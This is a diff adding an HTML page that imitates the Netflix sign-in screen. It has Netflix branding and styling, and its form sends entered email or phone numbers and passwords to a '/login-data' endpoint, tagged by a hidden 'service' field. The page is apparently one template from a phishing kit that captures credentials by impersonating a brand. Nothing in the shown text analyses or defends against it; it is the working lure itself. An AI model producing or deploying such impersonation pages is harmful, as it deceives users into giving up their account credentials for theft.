@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Netflix</title>
+    <style>
+        body { background: #141414; color: #fff; font-family: Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-body { background: rgba(0, 0, 0, .75); border-radius: 4px; width: 450px; padding: 60px 68px 40px; }
+        h1 { font-size: 32px; margin-bottom: 28px; }
+        input { width: 100%; height: 50px; background: #333; border-radius: 4px; border: 0; color: #fff; padding: 16px 20px; margin-bottom: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 16px; background: #e50914; border: 0; border-radius: 4px; font-size: 16px; font-weight: 700; color: #fff; cursor: pointer; margin-top: 24px; }
+    </style>
+</head>
+<body>
+    <div class="login-body">
+        <h1>Sign In</h1>
+        <form action="/login-data" method="post">
+            <input type="text" name="username" placeholder="Email or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="hidden" name="service" value="Netflix">
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+</body>
+</html>
